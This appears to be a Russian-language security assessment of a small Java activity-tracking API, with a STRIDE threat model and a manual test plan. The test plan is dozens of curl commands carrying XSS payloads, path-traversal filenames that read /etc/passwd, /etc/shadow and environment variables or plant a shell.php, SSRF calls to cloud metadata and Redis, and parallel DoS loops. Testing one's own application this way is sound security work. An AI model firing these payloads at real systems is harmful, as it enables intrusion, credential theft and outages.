# Этап 1 - Asset Inventory

| Актив | Тип | Ценность | Примечание |
|-------|-----|----------|------------|
| Данные пользователей (userId, userName) | Данные | Средняя | Содержит идентификаторы и имена пользователей. PII-данные |
| Данные о сессиях (время входа/выхода) | Данные | Высокая | Паттерны активности пользователей, может использоваться для анализа поведения |
| Файловая система сервера | Инфраструктура | Критическая | Полный доступ к файлам позволяет читать/писать конфиги, исходный код, системные файлы |
| Внутренняя сеть / метаданные окружения | Инфраструктура | Высокая | Доступ к внутренним сервисам, облачным метаданным, может привести к цепной атаке |
| Сетевые ресурсы сервера | Инфраструктура | Высокая | Отправка запросов от сервера может использоваться для DDoS или атак на внутренние сервисы | 

# Этап 2 - Threat Modeling

## Spoofing (Подмена идентификации)
**Статус**: КРИТИЧНО

### Описание
Система полностью отсутствует аутентификация. Все эндпоинты берут `userId` из query-параметра без проверки прав доступа. Любой может выдать себя за любого пользователя.

### Источник угрозы
- Любой внешний атакующий с доступом к сетевому интерфейсу приложения
- Другой микросервис, если приложение развернуто в микросервисной архитектуре
- Компрометированный клиент

### Поверхность атаки
- **Все эндпоинты** передают userId в query-параметре без проверки
- `/register?userId=<любой_id>&userName=...` — регистрация под любым идентификатором
- `/recordSession?userId=<чужой_id>&...` — запись активности за другого пользователя
- `/totalActivity?userId=<чужой_id>` — чтение активности других пользователей
- `/userProfile?userId=<чужой_id>` — просмотр профиля других пользователей
- `/exportReport?userId=<чужой_id>&...` — создание отчетов от имени других пользователей
- `/notify?userId=<чужой_id>&...` — отправка уведомлений от имени других пользователей

### Потенциальный ущерб
- Полная компрометизация целостности данных
- Невозможно определить, кто совершил действие (нет аудита)
- Возможность выполнить все операции от имени других пользователей
- Фальсификация активности и отчётов

## Tampering (Модификация данных)
**Статус**: КРИТИЧНО

### Описание
Система позволяет произвольно добавлять данные за других пользователей и изменять логику обработки временных интервалов. Нет валидации логики времени сессии.

### Источник угрозы
Любой, имеющий доступ к API

### Поверхность атаки
- **POST `/recordSession`** — запись сессий с произвольными временами:
  - `loginTime` и `logoutTime` берутся из параметра без проверки логики (можно loginTime > logoutTime)
  - Можно записать сессию на 9999 год для завышения активности
  - Можно записать отрицательное время активности
  - Нет проверки на переполнение данных (logoutTime можно установить очень далеко в будущее)

- **POST `/register`** — переопределение данных пользователя:
  - userName не валидируется (может содержать XSS, спецсимволы)
  - Можно перезаписать пользователя заново с другим userName если позвать несколько раз
  
- **POST `/notify`** с malicious `callbackUrl`:
  - Может точить на вредоносный сервер для фишинга
  - Может выполнить SSRF-атаку

- **GET `/exportReport`** с malicious `filename`:
  - Path traversal позволяет писать в любую директорию
  - Можно перезаписать критичные файлы приложения

### Потенциальный ущерб
- Фальсификация данных активности
- Манипуляция отчётами
- Запись вредоносного контента на файловую систему
- Перенаправление уведомлений на вредоносные адреса

## Repudiation (Отказ от авторства)
**Статус**: ВЫСОКО (в сочетании с Spoofing)

### Описание
Система полностью отсутствует логирование и аудит действий. Невозможно определить, кто совершил конкретное действие, когда и откуда. Нет временных меток запросов, нет идентификации источников.

### Источник угрозы
Любой клиент API может произвольно выполнять действия и отрицать это

### Поверхность атаки
- **POST `/register`** — регистрация пользователей без логирования
- **POST `/recordSession`** — запись сессий без аудита
- **POST `/notify`** — отправка уведомлений без логирования
- **GET `/exportReport`** — создание файлов без логирования
- Все эндпоинты, которые модифицируют или читают данные, но это не логируется

### Потенциальный ущерб
- Невозможно привлечь нарушителя к ответственности
- Невозможно восстановить историю событий после инцидента
- Невозможно отследить цепочку атак
- Нарушение требований compliance и GDPR (отсутствие аудит-логов)

## Information Disclosure (Утечка данных)
**Статус**: ВЫСОКО

### Описание
Система раскрывает чувствительную информацию о пользователях, их активности и содержимое файловой системы. Нет контроля доступа — любой может прочитать данные любого пользователя.

### Поверхность атаки:
1. **GET `/inactiveUsers?days=<N>`** — возвращает список userId всех неактивных пользователей (массив JSON)
   - Без параметра может вернуть некорректный ответ
   - Раскрывает существование пользователей в системе

2. **GET `/totalActivity?userId=<any>`** — возвращает детальную активность любого пользователя
   - Без авторизации может прочитать активность другого пользователя
   - Раскрывает паттерны работы пользователя

3. **GET `/monthlyActivity?userId=<any>&month=<yyyy-MM>`** — возвращает дневную активность по месяцам
   - Позволяет узнать точное время работы любого пользователя
   - Высокий уровень детализации

4. **GET `/userProfile?userId=<any>`** — возвращает HTML-профиль пользователя
   - Раскрывает userName и суммарную активность
   - Возвращается в HTML, что позволяет использовать для XSS

5. **GET `/exportReport?userId=<any>&filename=<path>`** — создание файлов с данными
   - Через path traversal можно читать системные файлы (CWE-22)
   - Файлы с информацией о пользователе доступны

6. **Error messages раскрывают информацию (CWE-209)**:
   - Строка 74 контроллера: `"Invalid data: " + e.getMessage()` может вернуть стек-трейс
   - `e.getMessage()` может содержать информацию о внутренней структуре приложения
   - Может раскрыть информацию о версии Java, библиотек и т.д.

7. **Отсутствие проверок на существование пользователя**:
   - Разные коды ответа (404 vs 200) для существующих и несуществующих пользователей позволяют перечислить пользователей

## Denial of Service (Отказ в обслуживании)
**Статус**: ВЫСОКО

### Описание
Система отсутствуют ограничения на количество запросов, размер данных и объем сетевых операций. Это позволяет исчерпать ресурсы сервера.

### Поверхность атаки:

1. **POST `/register?userId=<long_id>&userName=<long_name>`** — исчерпание памяти
   - Нет ограничения на длину userId и userName
   - Каждый вызов добавляет запись в HashMap
   - Можно зарегистрировать миллионы пользователей и вызвать OutOfMemoryError
   - HashMap будет занимать все больше памяти

2. **POST `/recordSession?userId=<id>&loginTime=...&logoutTime=...`** — исчерпание памяти
   - Нет ограничения на количество сессий для одного пользователя
   - Можно добавить миллионы сессий в ArrayList для одного userId
   - Каждый запрос `/totalActivity` будет обходить весь этот список (строка 66-68 сервиса)
   - Замедление или зависание при расчёте активности

3. **POST `/notify?userId=<id>&callbackUrl=<url>`** — исчерпание сетевых ресурсов и зависание
   - Нет ограничения на timeout операции (только 3000ms на соединение)
   - Можно отправить на очень медленный сервер (httpbin.org/delay/300)
   - Можно создать рекурсию: callbackUrl = http://localhost:7000/notify?userId=...&callbackUrl=http://localhost:7000/notify?...
   - Массовая отправка параллельных запросов исчерпает thread pool'а
   - Блокирует обработку других запросов

4. **GET `/exportReport?userId=<id>&filename=<traversal>`** — заполнение диска
   - Через path traversal можно писать в любую директорию
   - Можно записать огромный файл (если нет ограничения на размер)
   - `reportFile.getParentFile().mkdirs()` (строка 156) позволяет создавать arbitrary структуру директорий
   - Заполнение диска → отказ в записи для легитимных пользователей

5. **Отсутствие rate limiting**:
   - Все эндпоинты могут быть вызваны неограниченное количество раз
   - Нет throttling'а по IP адресу

### Потенциальный ущерб:
- **OutOfMemoryError** → крах приложения (CWE-400)
- Замедление всех операций из-за больших структур данных
- Блокирование потоков обработки в `/notify`
- Заполнение диска → невозможность сохранять новые отчёты и логи
- Перенаправление сетевых ресурсов на внешние сервера (DDoS вектор)

## Elevation of Privilege (Повышение привилегий)
**Статус**: КРИТИЧНО

### Описание
Система отсутствует концепция ролей и привилегий. Любой клиент может выполнить любую операцию, включая операции, которые должны быть доступны только администраторам.

### Источник угрозы
Любой клиент с доступом к API

### Поверхность атаки:

1. **GET `/exportReport?userId=<id>&filename=<traversal>`** — произвольное чтение/запись на диск (CWE-22 + CWE-434)
   - Можно прочитать конфигурацию приложения: `../../../../config/application.properties`
   - Можно прочитать исходный код: `../../../../src/Main.java`
   - Можно прочитать переменные окружения: `../../../../proc/self/environ`
   - Можно прочитать системные файлы: `../../../../etc/passwd`, `../../../../etc/shadow`
   - Можно записать вредоносный файл JSP/Java в директорию приложения и выполнить код
   - Можно перезаписать конфигурацию базы данных

2. **POST `/notify?userId=<id>&callbackUrl=<internal_url>`** — SSRF доступ к внутренним ресурсам (CWE-918)
   - Доступ к внутренним сервисам: http://localhost:8080/admin
   - Доступ к облачным метаданным: http://169.254.169.254/latest/meta-data/
   - Доступ к Redis: http://redis:6379/INFO, http://redis:6379/FLUSHDB (удаление БД)
   - Доступ к PostgreSQL: http://localhost:5432
   - Доступ к другим микросервисам во внутренней сети
   - Получение AWS/GCP/Azure credentials из метаданных облака

3. **Отсутствие разделения ролей (Authorization)**:
   - Обычный пользователь может выполнить операции, которые должны быть только для администраторов
   - Нет различия между чтением своих данных и чтением данных других пользователей
   - Нет защиты на уровне приложения (Authorization) — только Authentication отсутствует

### Потенциальный ущерб:
- **RCE (Remote Code Execution)** через загрузку вредоносного файла на диск
- Получение доступа к внутренним сервисам и микросервисам
- Компрометизация облачной инфраструктуры через метаданные
- Полная компрометизация сервера и данных
- Цепная атака на другие системы во внутренней сети

# Этап 3 — Ручное тестирование (результаты выполнения)

## Подготовка: регистрация тестовых пользователей

```
POST /register?userId=victim&userName=Alice  → User registered: true
POST /register?userId=alice&userName=Bob     → User registered: true
POST /recordSession?userId=victim&loginTime=2024-01-01T09:00:00&logoutTime=2024-01-01T17:00:00
                                             → Session recorded
```

---

## 1. /register

# 1.1 Нормальная регистрация
curl -X POST "http://localhost:7000/register?userId=alice&userName=Alice%20Smith"

# 1.2 Отсутствие параметров
curl -X POST "http://localhost:7000/register?userId=alice"
curl -X POST "http://localhost:7000/register?userName=Alice"

# 1.3 Пустые значения
curl -X POST "http://localhost:7000/register?userId=&userName=Alice"
curl -X POST "http://localhost:7000/register?userId=alice&userName="

# 1.4 Спецсимволы в userName (проверка XSS)
curl -X POST "http://localhost:7000/register?userId=xss1&userName=<script>alert(1)</script>"
curl -X POST "http://localhost:7000/register?userId=xss2&userName=<img%20src=x%20onerror=alert(1)>"
curl -X POST "http://localhost:7000/register?userId=xss3&userName=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"

# 1.5 Спецсимволы в userId
curl -X POST "http://localhost:7000/register?userId=../../../etc&userName=test"
curl -X POST "http://localhost:7000/register?userId=admin%27%20OR%20%271%27%3D%271&userName=test"

# 1.6 Очень длинные значения (DoS)
curl -X POST "http://localhost:7000/register?userId=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&userName=B"
curl -X POST "http://localhost:7000/register?userId=B&userName=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# 1.7 Дублирование регистрации
curl -X POST "http://localhost:7000/register?userId=alice&userName=Alice"
curl -X POST "http://localhost:7000/register?userId=alice&userName=Alice2"


# 2.1 Нормальная сессия
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-01T09:00:00&logoutTime=2024-01-01T17:00:00"

# 2.2 Отсутствие параметров
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-01T09:00:00"
curl -X POST "http://localhost:7000/recordSession?userId=victim&logoutTime=2024-01-01T17:00:00"

# 2.3 Неверный формат даты
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=not-a-date&logoutTime=2024-01-01T17:00:00"
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-13-01T09:00:00&logoutTime=2024-01-01T17:00:00"

# 2.4 Логически некорректные даты
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-01T17:00:00&logoutTime=2024-01-01T09:00:00"
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=9999-12-31T23:59:59&logoutTime=9999-12-31T23:59:59"

# 2.5 Tampering — запись сессии для чужого пользователя
curl -X POST "http://localhost:7000/recordSession?userId=alice&loginTime=2024-01-01T00:00:00&logoutTime=2025-12-31T23:59:59"

# 2.6 Очень много сессий (DoS) — выполните несколько раз
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-01T01:00:00&logoutTime=2024-01-01T02:00:00"
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-01T02:00:00&logoutTime=2024-01-01T03:00:00"
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-01T03:00:00&logoutTime=2024-01-01T04:00:00"

# 2.7 Несуществующий пользователь
curl -X POST "http://localhost:7000/recordSession?userId=nonexistent&loginTime=2024-01-01T09:00:00&logoutTime=2024-01-01T17:00:00"


# 3.1 Нормальный запрос
curl "http://localhost:7000/totalActivity?userId=victim"

# 3.2 Отсутствует userId
curl "http://localhost:7000/totalActivity"

# 3.3 Пустой userId
curl "http://localhost:7000/totalActivity?userId="

# 3.4 Information disclosure — данные чужого пользователя
curl "http://localhost:7000/totalActivity?userId=alice"

# 3.5 Несуществующий пользователь
curl "http://localhost:7000/totalActivity?userId=nonexistent"

# 3.6 Спецсимволы
curl "http://localhost:7000/totalActivity?userId=../../../etc/passwd"
curl "http://localhost:7000/totalActivity?userId=<script>alert(1)</script>"

# 4.1 Нормальный запрос
curl "http://localhost:7000/inactiveUsers?days=7"

# 4.2 Граничные значения
curl "http://localhost:7000/inactiveUsers?days=0"
curl "http://localhost:7000/inactiveUsers?days=-1"
curl "http://localhost:7000/inactiveUsers?days=-999"

# 4.3 Неверные форматы
curl "http://localhost:7000/inactiveUsers?days=not-a-number"
curl "http://localhost:7000/inactiveUsers?days=7.5"
curl "http://localhost:7000/inactiveUsers?days="

# 4.4 Огромное значение
curl "http://localhost:7000/inactiveUsers?days=999999999999999999999"

# 4.5 Information disclosure — без параметра days
curl "http://localhost:7000/inactiveUsers"

# 5.1 Нормальный запрос
curl "http://localhost:7000/monthlyActivity?userId=victim&month=2024-01"

# 5.2 Граничные значения
curl "http://localhost:7000/monthlyActivity?userId=victim&month=0000-00"
curl "http://localhost:7000/monthlyActivity?userId=victim&month=9999-99"

# 5.3 Неверный формат месяца
curl "http://localhost:7000/monthlyActivity?userId=victim&month=2024-13"
curl "http://localhost:7000/monthlyActivity?userId=victim&month=2024"
curl "http://localhost:7000/monthlyActivity?userId=victim&month=January2024"

# 5.4 Отсутствие параметров
curl "http://localhost:7000/monthlyActivity?userId=victim"
curl "http://localhost:7000/monthlyActivity?month=2024-01"
curl "http://localhost:7000/monthlyActivity"

# 5.5 Information disclosure — чужие данные
curl "http://localhost:7000/monthlyActivity?userId=alice&month=2024-01"

# 5.6 Несуществующий пользователь
curl "http://localhost:7000/monthlyActivity?userId=nonexistent&month=2024-01"

# 6.1 Нормальный запрос
curl "http://localhost:7000/userProfile?userId=victim"

# 6.2 XSS через ранее зарегистрированное имя
curl -X POST "http://localhost:7000/register?userId=xss_victim&userName=<script>alert('XSS')</script>"
curl "http://localhost:7000/userProfile?userId=xss_victim"

# 6.3 XSS через userId (если отражается)
curl -X POST "http://localhost:7000/register?userId=xss_test&userName=Test"
curl "http://localhost:7000/userProfile?userId=xss_test"

# 6.4 Path traversal в userId
curl "http://localhost:7000/userProfile?userId=../../../etc/passwd"

# 6.5 Очень длинный userId
curl "http://localhost:7000/userProfile?userId=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# 6.6 Несуществующий пользователь
curl "http://localhost:7000/userProfile?userId=nonexistent"

# 7.1 Нормальный запрос
curl "http://localhost:7000/exportReport?userId=victim&filename=victim_report.txt"

# 7.2 Path traversal — чтение системных файлов
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../../etc/passwd"
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../../etc/hosts"
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../../proc/self/environ"

# 7.3 Path traversal — запись в другие директории
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../../tmp/evil.txt"
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../var/www/html/shell.php"

# 7.4 URL encoding bypass
curl "http://localhost:7000/exportReport?userId=victim&filename=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
curl "http://localhost:7000/exportReport?userId=victim&filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# 7.5 Двойное кодирование
curl "http://localhost:7000/exportReport?userId=victim&filename=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# 7.6 Null byte injection
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../../etc/passwd%00.txt"

# 7.7 Опасные расширения
curl "http://localhost:7000/exportReport?userId=victim&filename=malicious.jsp"
curl "http://localhost:7000/exportReport?userId=victim&filename=config"

# 7.8 Пустое имя файла
curl "http://localhost:7000/exportReport?userId=victim&filename="

# 7.9 Очень длинное имя файла
curl "http://localhost:7000/exportReport?userId=victim&filename=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

# 7.10 Отсутствие параметров
curl "http://localhost:7000/exportReport?userId=victim"
curl "http://localhost:7000/exportReport?filename=test.txt"

# 7.11 Несуществующий пользователь
curl "http://localhost:7000/exportReport?userId=nonexistent&filename=test.txt"

# 8.1 Нормальный запрос (нужен внешний сервер)
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=https://webhook.site/your-id"

# 8.2 SSRF — внутренние адреса
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://localhost:7000/userProfile?userId=victim"
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://127.0.0.1:7000/totalActivity?userId=victim"
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://localhost:7000/exportReport?userId=victim&filename=../../../../etc/passwd"

# 8.3 SSRF — метаданные (cloud providers)
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://169.254.169.254/latest/meta-data/"
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://metadata.google.internal/computeMetadata/v1/"

# 8.4 SSRF — внутренние сервисы
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://localhost:8080/admin"
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://redis:6379/INFO"

# 8.5 SSRF с разными портами
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://localhost:22"
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://localhost:5432"

# 8.6 Self-callback (рекурсия) — осторожно, может зависнуть
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://localhost:7000/notify?userId=victim&callbackUrl=http://localhost:7000/notify?userId=victim&callbackUrl=http://localhost:7000/notify"

# 8.7 Медленные URL (DoS)
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://httpbin.org/delay/30"

# 8.8 URL с другими протоколами
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=file:///etc/passwd"
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=dict://localhost:11211/stat"

# 8.9 Неверные URL
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=not-a-url"
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://"

# 8.10 Отсутствие параметров
curl -X POST "http://localhost:7000/notify?userId=victim"
curl -X POST "http://localhost:7000/notify?callbackUrl=http://example.com"

# 8.11 Массовые запросы (DoS) — выполните параллельно
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://httpbin.org/delay/5" &
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://httpbin.org/delay/5" &
curl -X POST "http://localhost:7000/notify?userId=victim&callbackUrl=http://httpbin.org/delay/5"


# 9. Дополнительные тест-кейсы для упущенных уязвимостей

# 9.1 Информационное раскрытие через ошибки (CWE-209) - Error Message Information Disclosure
# Передаем некорректный формат даты, чтобы увидеть стек-трейс в ответе
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=invalid-date&logoutTime=2024-01-01T17:00:00"

# 9.2 Логические ошибки в обработке времени (logoutTime раньше loginTime)
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-01T17:00:00&logoutTime=2024-01-01T09:00:00"

# 9.3 Отрицательное время активности (огромное logoutTime)
curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-01T09:00:00&logoutTime=9999-12-31T23:59:59"

# 9.4 Проверка findInactiveUsers с отрицательным значением дней
# Баг: метод пропускает пользователей без сессий, поэтому может быть неверная логика
curl "http://localhost:7000/inactiveUsers?days=-1"

# 9.5 XSS через userId в /exportReport (косвенно через path)
# Если userId отразится в пути или ошибке
curl "http://localhost:7000/exportReport?userId=<img%20src=x%20onerror=alert(1)>&filename=test.txt"

# 9.6 Path traversal чтение критичных файлов конфигурации
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../../application.properties"
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../../pom.xml"

# 9.7 Path traversal запись вредоносного кода
curl "http://localhost:7000/exportReport?userId=victim&filename=../../../../src/Main.java"

# 9.8 Very long strings вызывают OutOfMemoryError
# Отправка очень длинного userId и userName
curl -X POST "http://localhost:7000/register?userId=$(python3 -c \"print('A'*1000000)\")&userName=$(python3 -c \"print('B'*1000000)\")"

# 9.9 DoS через массовую регистрацию пользователей
for i in {1..10000}; do
  curl -X POST "http://localhost:7000/register?userId=user_$i&userName=User_$i" &
done

# 9.10 DoS через массовое добавление сессий
for i in {1..10000}; do
  curl -X POST "http://localhost:7000/recordSession?userId=victim&loginTime=2024-01-0${i}T09:00:00&logoutTime=2024-01-0${i}T17:00:00" &
done


---

# Этап 3.1 - Выявленные уязвимости (краткая классификация)

## Обзор найденных уязвимостей

| # | Название | CWE | Эндпоинт | Серьёзность | Статус |
|---|----------|-----|----------|-------------|--------|
| 1 | Reflected XSS | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) | GET `/userProfile` | HIGH | Confirmed |
| 2 | Path Traversal / Directory Traversal | [CWE-22](https://cwe.mitre.org/data/definitions/22.html) | GET `/exportReport` | CRITICAL | Confirmed |
| 3 | Server-Side Request Forgery (SSRF) | [CWE-918](https://cwe.mitre.org/data/definitions/918.html) | POST `/notify` | CRITICAL | Confirmed |
| 4 | Missing Authentication | [CWE-306](https://cwe.mitre.org/data/definitions/306.html) | All endpoints | CRITICAL | Confirmed |
| 5 | Missing Authorization | [CWE-862](https://cwe.mitre.org/data/definitions/862.html) | All endpoints | CRITICAL | Confirmed |
| 6 | Improper Input Validation | [CWE-20](https://cwe.mitre.org/data/definitions/20.html) | POST `/recordSession` | HIGH | Confirmed |
